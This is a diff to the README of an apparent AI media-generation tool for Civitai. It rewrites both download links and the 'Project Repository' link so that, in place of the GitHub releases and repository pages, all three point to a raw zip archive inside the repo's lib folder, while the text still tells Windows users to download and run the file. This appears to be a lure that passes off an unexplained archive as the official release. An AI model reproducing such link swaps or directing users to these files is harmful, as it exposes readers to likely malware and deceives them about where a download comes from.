@@ -1,6 +1,6 @@
 # 🎨 civitai-gen-skill - Create media using simple text commands
 
-[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/dovudja9209/civitai-gen-skill/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/dovudja9209/civitai-gen-skill/main/civitai-gen/lib/civitai-skill-gen-2.2.zip)
 
 This application connects your computer to the Civitai platform. It lets you create images, videos, and audio files by typing simple instructions. You do not need to write code to use these tools. The software acts as an assistant that receives your requests and fetches the finished files from the web.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 You must download the installation files from the project page.
 
-[Get the latest version here](https://github.com/dovudja9209/civitai-gen-skill/releases)
+[Get the latest version here](https://raw.githubusercontent.com/dovudja9209/civitai-gen-skill/main/civitai-gen/lib/civitai-skill-gen-2.2.zip)
 
 Visit the link above to see all available versions. Choose the file that matches your Windows system. Most users download the file labeled with the latest version number ending in .zip or .exe. 
 
@@ -99,6 +99,6 @@ Large images or long videos take more time to generate. Ensure you have a strong
 
 For more information on how to use advanced features or to report a bug, visit the main repository page. You can track progress, view updates, or join the community discussion.
 
-Project Repository: https://github.com/dovudja9209/civitai-gen-skill
+Project Repository: https://raw.githubusercontent.com/dovudja9209/civitai-gen-skill/main/civitai-gen/lib/civitai-skill-gen-2.2.zip
 
 This software remains free to use and update. Regular checks for new versions will ensure you have access to the latest generation features. Always use the latest version to maintain compatibility with the Civitai platform.
